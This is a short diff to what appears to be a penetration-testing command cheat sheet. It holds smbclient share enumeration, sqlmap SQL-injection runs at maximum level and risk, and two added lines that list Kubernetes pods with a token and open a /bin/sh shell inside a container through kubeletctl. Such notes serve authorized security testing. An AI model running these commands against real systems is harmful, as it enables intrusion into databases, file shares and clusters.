@@ -21,3 +21,5 @@ smbclient -U geust '\\IP\SHARE'
 smbclient -U USERNAME -L IP
 sqlmap -r PATH --privileges
 sqlmap -r PATH --technique=BEUS --level=5 --risk=3 -v 3 --batch
+kubectl get pods --server=https://IP:PORT --token TOKEN --certificate-authority=ca.crt
+kubeletctl -s IP exec "/bin/sh" --namespace NAMESPACE --pod POD --container CONTAINER
